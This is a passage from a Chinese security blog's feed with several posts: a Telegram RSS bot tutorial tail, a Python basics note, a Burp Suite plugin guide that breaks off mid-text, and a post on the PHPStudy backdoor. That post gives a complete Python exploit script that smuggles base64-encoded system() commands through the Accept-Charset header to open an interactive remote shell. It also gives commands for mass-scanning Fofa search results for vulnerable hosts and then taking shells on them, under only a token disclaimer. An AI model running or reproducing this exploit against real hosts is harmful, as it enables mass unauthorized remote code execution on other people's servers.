class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/rss       - 显示当前订阅的 RSS 列表，加 raw 参数显示链接</span><br><span class="line">/sub       - 订阅一个 RSS: /sub http://example.com/feed.xml</span><br><span class="line">/unsub     - 退订一个 RSS: /unsub http://example.com/feed.xml</span><br><span class="line">/unsubthis - 使用此命令回复想要退订的 RSS 消息即可退订, 不支持 Channel</span><br><span class="line">/export    - 导出为 OPML</span><br></pre></td></tr></table></figure><p>【示例】</p><p>订阅：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150314.png" class="lozad"></p><p>退订：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150348.png" class="lozad"></p><p>查看订阅的地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150438.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://51.ruyo.net/13304.html" target="_blank" rel="noopener">https://51.ruyo.net/13304.html</a></p><p><a href="https://www.moerats.com/archives/566/" target="_blank" rel="noopener">https://www.moerats.com/archives/566/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 +前言&quot;&gt;&lt;/a&gt;0x00 +前言&lt;/h1&gt;&lt;p&gt;一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="https://www.mad-coding.cn/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="telegram" scheme="https://www.mad-coding.cn/tags/telegram/"/>
    
      <category term="机器人" scheme="https://www.mad-coding.cn/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门检测及利用</title>
    <link href="https://www.mad-coding.cn/2019/10/09/phpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/09/phpstudy后门检测及利用/</id>
    <published>2019-10-09T03:43:02.000Z</published>
    <updated>2019-10-11T09:00:44.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>【环境需求】</p><p>kali Linux渗透测试系统</p><p>saucerframe攻击框架</p><p>PHPstudy利用脚本</p></blockquote><h2 id="1-1-kali-Linux系统安装"><a href="#1-1-kali-Linux系统安装" class="headerlink" title="1.1 kali Linux系统安装"></a>1.1 kali Linux系统安装</h2><p>出门右拐百度，一大堆教程</p><h2 id="1-2-saucerframe攻击框架的安装"><a href="#1-2-saucerframe攻击框架的安装" class="headerlink" title="1.2 saucerframe攻击框架的安装"></a>1.2 saucerframe攻击框架的安装</h2><p>框架GitHub地址：<a href="https://github.com/saucer-man/saucerframe" target="_blank" rel="noopener">传送门</a></p><p>【安装步骤】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saucer-man/saucerframe.git </span><br><span class="line"><span class="built_in">cd</span> saucerframe</span><br><span class="line">pip install -r requirement.txt</span><br></pre></td></tr></table></figure><blockquote><p>saucerframe框架需要python3的环境。</p></blockquote><p>【使用说明】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 指定poc脚本(必需,支持同时指定多个poc)</span></span><br><span class="line">-s redis_unauth,mongodb_unauth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 指定目标(必需)</span></span><br><span class="line">-iU www.xxx.com  单个目标</span><br><span class="line">-iF target.txt  从文本中加载</span><br><span class="line">-iR 192.168.1.1-192.168.2.100  根据ip地址范围加载</span><br><span class="line">-iN 192.168.1.0/24  根据网段加载</span><br><span class="line">-aZ <span class="string">"redis"</span>  ZoomEye api加载</span><br><span class="line">-aS <span class="string">"redis"</span>  Shodan api加载</span><br><span class="line">-aC <span class="string">"redis"</span>  Censys api加载</span><br><span class="line">-aF <span class="string">"redis"</span>  Fofa api加载</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 其他(可选)</span></span><br><span class="line">-h  查看帮助信息</span><br><span class="line">-t 300  并发数(默认100)</span><br><span class="line">--proxy socks5://127.0.0.1:1080  使用sock5代理</span><br><span class="line">-o result.txt  指定输出文件</span><br><span class="line">-v 4 指定终端输出详细级别(1-5, 默认为2)</span><br><span class="line">--show  查看所有poc</span><br><span class="line">-eT  并发采用多线程方式</span><br><span class="line">-eG  并发采用协程方式(默认)</span><br></pre></td></tr></table></figure><h2 id="1-3-PHPstudy后门利用脚本"><a href="#1-3-PHPstudy后门利用脚本" class="headerlink" title="1.3 PHPstudy后门利用脚本"></a>1.3 PHPstudy后门利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   PHPStudy_Backdoor.py</span></span><br><span class="line"><span class="string">@Time    :   2019/09/23 19:17:02</span></span><br><span class="line"><span class="string">@Author  :   fuhei </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Blog    :   http://www.lovei.org</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">    <span class="string">'accept-charset'</span>: <span class="string">'ZXhpdCgnZnVoZWk2NjYnKTs='</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url, command=<span class="string">"whoami"</span>)</span>:</span></span><br><span class="line">    command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    user = result = requests.get(url, headers=headers, verify=<span class="literal">False</span>).text.split(<span class="string">'&lt;!'</span>)[<span class="number">0</span>].strip(<span class="string">'\r\n'</span>)</span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        command = input(user+<span class="string">"@fuhei$ "</span>)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">'exit'</span> <span class="keyword">or</span> command  == <span class="string">'quit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">            result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">            result.encoding = <span class="string">"GBK"</span></span><br><span class="line">            print(result)</span><br><span class="line">            result = result.text.split(<span class="string">'&lt;!'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Cannot execute a blank command in'</span> <span class="keyword">in</span> result[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(result[<span class="number">0</span>], end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'fuhei666'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">"[+] Remote code execution vulnerability exists at the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] There is no remote code execution vulnerability in the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:     </span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> check(url):</span><br><span class="line">            exp(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/"</span>)</span><br></pre></td></tr></table></figure><h1 id="0x02-开炮"><a href="#0x02-开炮" class="headerlink" title="0x02 开炮"></a>0x02 开炮</h1><p>进入saucerframe文件夹，查看可利用的PHPstudy后门扫描脚本。</p><blockquote><p>python saucerframe.py –show</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142554.png" class="lozad"></p><blockquote><p>python saucerframe.py -s phpstudy_backdoor.py -aF “phpstudy”</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142952.png" class="lozad"></p><blockquote><p>python phpstudy_getshell.py <a href="http://IP地址" target="_blank" rel="noopener">http://IP地址</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009152327.png" class="lozad"></p><blockquote><p>免责声明：</p><p><strong>本文意在讨论使用工具来应对软件研发领域中，日益增长的安全性质量测试需求。本文涉及到的工具不可被用于攻击目的**</strong>，本人概不承担一切后果。**</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHPstudy后门" scheme="https://www.mad-coding.cn/tags/PHPstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫学习笔记（一）</title>
    <link href="https://www.mad-coding.cn/2019/10/08/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/08/python爬虫学习笔记（一）/</id>
    <published>2019-10-08T03:28:29.000Z</published>
    <updated>2019-10-28T08:57:08.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了记录自己的学习进度，并且将自己学习的内容巩固消化，决定将学习的知识用笔记的方式记录下来。</p><a id="more"></a><h1 id="0x01-python初识"><a href="#0x01-python初识" class="headerlink" title="0x01 python初识"></a>0x01 python初识</h1><h2 id="1-1-python简介"><a href="#1-1-python简介" class="headerlink" title="1.1 python简介"></a>1.1 python简介</h2><p>Python 是 一 门 <strong>面 向 对 象 的</strong> 、 <strong>解 释 型</strong> 的 编 程 语 言 。<br>目 前 Python 常 见 的 版 本 有 Python2. X 和 Python3. X ， 总 结 起 来 ，<br>Python3. X 各 方 面 更 成 熟 完 善 些 ， Python2. X 处 理 速 度 更 快 一 些 ，<br>但 Python3. x 不 断 再 进 步 ， 肯 定 会 是 主 流 。<br>Python 的 优 点 有 很 多 ， 比 如 简 洁 、 易 学 、 几 乎 全 能 、 支 持 面<br>向 对 象 等 。 </p><blockquote><p>【知识拓展】</p><p>OOP—面向对象的编程语言</p><p><a href="https://www.cnblogs.com/yimengxianzhi/p/7802021.html" target="_blank" rel="noopener">https://www.cnblogs.com/yimengxianzhi/p/7802021.html</a></p><p>面向对象的编程语言适合做大型的项目，</p><p>面向过程的编程语言适合做中小型的项目。</p></blockquote><h2 id="1-2-python能做什么"><a href="#1-2-python能做什么" class="headerlink" title="1.2 python能做什么"></a>1.2 python能做什么</h2><ol><li>Python 能 做 什 么 </li><li>数 据 分 析 与 挖 掘 </li><li>黑 客 逆 向 编 程 </li><li>网 络 爬 虫 </li><li>机 器 学 习 </li><li>开 发 WEB 项 目 </li><li>开 发 游 戏 </li><li>自 动 化 运 维 </li><li>…</li></ol><h1 id="0x02-python基础语法"><a href="#0x02-python基础语法" class="headerlink" title="0x02 python基础语法"></a>0x02 python基础语法</h1><h2 id="2-1-输出"><a href="#2-1-输出" class="headerlink" title="2.1 输出"></a>2.1 输出</h2><p>2.x输出：print “hello world”</p><p>3.x输出：print(“hello world”)</p><h2 id="2-2-注释"><a href="#2-2-注释" class="headerlink" title="2.2 注释"></a>2.2 注释</h2><ol><li><p>单行注释：#</p></li><li><p>多行注释：三引号注释法</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print("hello world")</span></span><br><span class="line">···</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">···</span><br></pre></td></tr></table></figure><h2 id="2-3-标识符"><a href="#2-3-标识符" class="headerlink" title="2.3 标识符"></a>2.3 标识符</h2><h2 id="2-4-变量"><a href="#2-4-变量" class="headerlink" title="2.4 变量"></a>2.4 变量</h2><h2 id="2-5-数据类型"><a href="#2-5-数据类型" class="headerlink" title="2.5 数据类型"></a>2.5 数据类型</h2><h2 id="2-6-运算符"><a href="#2-6-运算符" class="headerlink" title="2.6 运算符"></a>2.6 运算符</h2><h2 id="2-7-缩进"><a href="#2-7-缩进" class="headerlink" title="2.7 缩进"></a>2.7 缩进</h2><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;为了记录自己的学习进度，并且将自己学习的内容巩固消化，决定将学习的知识用笔记的方式记录下来。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>burpsuite常用插件推荐与使用（不断跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/10/04/burpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/04/burpsuite常用插件推荐与使用/</id>
    <published>2019-10-04T02:36:43.000Z</published>
    <updated>2019-10-18T08:58:48.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>做安全的人都知道，burpsuite是安全从业者必须要会使用的神器，之所以称之为神器，是因为他不仅功能强大，好用，界面美观，还有丰富的插件拓展功能，支持python和java写的插件，用户可以在插件商城中去安装，有代码编写能力的，还可以自己编写插件。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/b0a2a870df891caa" class="lozad"></p><a id="more"></a><h1 id="0x01-Active-Scan"><a href="#0x01-Active-Scan" class="headerlink" title="0x01 Active Scan++"></a>0x01 Active Scan++</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>ActiveScan ++扩展了 Burp Suite 的主动和被动扫描功能，可以扫描出更多的漏洞。</p><h2 id="1-2-下载"><a href="#1-2-下载" class="headerlink" title="1.2 下载"></a>1.2 下载</h2><blockquote><p><a href="https://github.com/albinowax/ActiveScanPlusPlus" target="_blank" rel="noopener">https://github.com/albinowax/ActiveScanPlusPlus</a></p></blockquote><h2 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3 安装"></a>1.3 安装</h2><p>需要 jython-standalone-2.5.jar 环境,参考<a href="[https://www.mad-coding.cn/%2F2019%2F08%2F19%2Fburp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99%2F#0x00-%E5%89%8D%E8%A8%80](https://www.mad-coding.cn/%2F2019%2F08%2F19%2Fburp加载jython时出错%2F#0x00-前言)">burp加载jython时出错</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015085137.png" class="lozad"></p><h2 id="1-4-使用"><a href="#1-4-使用" class="headerlink" title="1.4 使用"></a>1.4 使用</h2><p>先在extender模块查看是否勾选上了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090248.png" class="lozad"></p><p>主被动扫描自己就调用了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090017.png" class="lozad"></p><h1 id="0x02-AutoRepeater"><a href="#0x02-AutoRepeater" class="headerlink" title="0x02 AutoRepeater"></a>0x02 AutoRepeater</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>Burp Suite是一个拦截HTTP代理，它是执行Web应用程序安全测试的事实工具。虽然Burp Suite是一个非常有用的工具，但使用它来执行授权测试通常是一项涉及“更改请求和重新发送”循环的繁琐工作，这可能会漏掉漏洞并减慢测试速度。AutoRepeater是一个开源的Burp Suite扩展，旨在减轻这种努力。AutoRepeater可自动化和简化Web应用程序授权测试，并为安全研究人员提供易于使用的工具，可在Burp Suite中自动复制，修改和重新发送请求，同时快速评估响应的差异。</p><p>AutoRepeater仅重新发送由定义的替换更改的请求。当AutoRepeater收到与给定选项卡设置的条件匹配的请求时，AutoRepeater将首先将每个已定义的基本替换应用于请求，然后将复制请求，并为每个已定义的替换执行基本替换，并将给定的替换应用于请求。</p><h3 id="【AutoRepeater特点】"><a href="#【AutoRepeater特点】" class="headerlink" title="【AutoRepeater特点】"></a>【AutoRepeater特点】</h3><p>没有AutoRepeater，基本的Burp Suite Web应用程序测试流程如下：</p><ol><li>用户面对Web应用程序，直到找到有趣的请求</li><li>用户将请求发送到Burp Suite的“Repeater”工具</li><li>用户在“Repeater”中修改请求并将其重新发送到服务器</li><li>重复步骤3，直到找到甜蜜漏洞</li><li>从第1步开始，直到用户用完测试时间或者可以退出bug赏金收入</li></ol><p>虽然此测试流程有效，但测试任何请求中可能存在的问题尤为繁琐。例如，更改电子邮件地址，帐户身份，角色，URL和CSRF令牌都可能导致漏洞。目前，Burp Suite不会在Web应用程序中快速测试这些类型的漏洞。</p><p>现有一些Burp Suite插件（AuthMatrix，Authz和Autorize）可以使授权测试更容易，但每个插件都有限制其实用性的问题。AuthMatrix和Authz要求用户向插件发送特定请求，并设置授权测试执行方式的规则，这会导致丢失重要请求的风险并降低测试速度。Autorize不为用户提供执行通用文本替换的能力，并且具有令人困惑的用户界面。AutoRepeater从这些插件中获取所有最佳创意，以及Burp Suite熟悉的用户界面，并将它们组合在一起以创建最简化的授权测试插件。</p><p>AutoRepeater提供了一种通用解决方案，用于简化Web应用程序中的授权测试。AutoRepeater提供以下功能：</p><ul><li>自动复制，修改和重新发送任何请求</li><li>有条件的替代品</li><li>快速标题，Cookie和参数值替换</li><li>拆分请求/响应查看器</li><li>原始与修改的请求/响应差异查看器</li><li>基本替换中断CSRF令牌和会话cookie等请求的值</li><li>Renamable标签</li><li>记录</li><li>出口</li><li>切换激活</li><li>从其他Burp Suite工具“发送到AutoRepeater”</li></ul><h2 id="2-2-下载"><a href="#2-2-下载" class="headerlink" title="2.2 下载"></a>2.2 下载</h2><blockquote><p>项目地址：<a href="https://github.com/nccgroup/AutoRepeater" target="_blank" rel="noopener">https://github.com/nccgroup/AutoRepeater</a></p></blockquote><h2 id="2-3-安装"><a href="#2-3-安装" class="headerlink" title="2.3 安装"></a>2.3 安装</h2><p>【方法一】</p><p>可以在应用市场中快速的安装，缺点是安装的版本不是最新的版本。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015093909.png" class="lozad"></p><p>【方法二】</p><p>自行下载添加安装，<a href="https://github.com/nccgroup/AutoRepeater/blob/master/AutoRepeater.jar" target="_blank" rel="noopener">下载传送门</a>，然后</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094052.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090816.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094126.png" class="lozad"></p><p>安装完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094208.png" class="lozad"></p><h2 id="2-4-使用"><a href="#2-4-使用" class="headerlink" title="2.4 使用"></a>2.4 使用</h2><blockquote><p>流程：先点开关，在replacements添加替换规则，之后logs一般默认即可，接下来将数据包发送到AutoRepeater就可以分析了，我这里面为了直观，替换规则是“将GET换成POST了”</p></blockquote><h3 id="2-4-1-功能介绍"><a href="#2-4-1-功能介绍" class="headerlink" title="2.4.1 功能介绍"></a>2.4.1 功能介绍</h3><p>【replacements】</p><p><img alt="nkyBK1.png" data-src="https://s2.ax1x.com/2019/09/03/nkyBK1.png" class="lozad"></p><blockquote><p>还有很多其他的规则，这里只是做了一个示范</p></blockquote><p>【logs】</p><p><img alt="nkcl7V.png" data-src="https://s2.ax1x.com/2019/09/03/nkcl7V.png" class="lozad"><br>大致布局</p><p><img alt="nkD1u6.png" data-src="https://s2.ax1x.com/2019/09/03/nkD1u6.png" class="lozad"></p><p>……忘了标记顺序了，就这样吧</p><h3 id="2-4-2-使用注意事项"><a href="#2-4-2-使用注意事项" class="headerlink" title="2.4.2 使用注意事项"></a>2.4.2 使用注意事项</h3><p>1.未开始测试的时候，先不要开启，默认是开启状态</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092201.png" class="lozad"></p><p>开启状态</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092306.png" class="lozad"></p><p>2.cookie jar不能勾选上</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092422.png" class="lozad"></p><p>3.重启之后，数据会丢失，规则配置还在</p><h3 id="2-4-3-AutoRepeater替换规则举例"><a href="#2-4-3-AutoRepeater替换规则举例" class="headerlink" title="2.4.3 AutoRepeater替换规则举例"></a>2.4.3 AutoRepeater替换规则举例</h3><p>【测试未经身份验证的用户访问】</p><p>要测试未经身份验证的用户是否可以访问该应用程序[删除cookie]，需要选择Remove Header By Name之后；Match选择Cookie</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015095811.png" class="lozad"></p><p>【测试经过身份验证的用户访问(越权之类)】</p><p>要测试越权之类【替换cookie值】的，需要在Base Replacements下为cookie配置一个规则， Match Cookie Name, Replace Value匹配cookie名称，替换为权限较低的用户的cookie值</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015095851.png" class="lozad"></p><h2 id="2-5-参考"><a href="#2-5-参考" class="headerlink" title="2.5 参考"></a>2.5 参考</h2><p><a href="https://github.com/nccgroup/AutoRepeater" target="_blank" rel="noopener">https://github.com/nccgroup/AutoRepeater</a></p><p><a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage" target="_blank" rel="noopener">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></p><h1 id="0x03-jsEncrypter"><a href="#0x03-jsEncrypter" class="headerlink" title="0x03 jsEncrypter"></a>0x03 jsEncrypter</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>jsEncrypter是一个<a href="https://www.uedbox.com/post/tag/burpsuite/" target="_blank" rel="noopener">BurpSuite</a>插件，使用phantomjs调用前端<a href="https://www.uedbox.com/post/tag/加密/" target="_blank" rel="noopener">加密</a>函数对数据进行加密，方便对加密数据输入点进行fuzz。</p><h2 id="3-2-jsEncrypter下载"><a href="#3-2-jsEncrypter下载" class="headerlink" title="3.2 jsEncrypter下载"></a>3.2 jsEncrypter下载</h2><p>1：直接在<a href="https://github.com/c0ny1/jsEncrypter/releases" target="_blank" rel="noopener">releases</a>下载</p><p>2：自行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/c0ny1/jsEncrypter.git</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>3: 编译好的：<a href="http://pan.mad-coding.cn/%E5%B7%A5%E5%85%B7/jsEncrypter-0.3.jar" target="_blank" rel="noopener">传送门</a> </p><h2 id="3-3-安装插件"><a href="#3-3-安装插件" class="headerlink" title="3.3 安装插件"></a>3.3 安装插件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175432.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175535.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175601.png" class="lozad"></p><h2 id="3-4-jsEncrypter插件使用"><a href="#3-4-jsEncrypter插件使用" class="headerlink" 